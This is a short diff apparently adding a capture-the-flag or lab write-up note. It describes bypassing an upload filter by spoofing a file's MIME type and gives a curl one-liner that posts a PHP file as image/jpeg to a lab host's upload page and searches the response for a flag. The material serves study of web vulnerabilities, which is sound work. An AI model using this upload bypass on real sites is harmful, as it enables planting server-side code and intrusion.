@@ -1,0 +1,3 @@
+Just change the type of the file we're sending to insert any code that we want
+
+touch /tmp/hack.php; curl -s -X POST -F "uploaded=@/tmp/hack.php;type=image/jpeg" -F "Upload=Upload" "http://172.16.181.128/index.php?page=upload" | grep flag
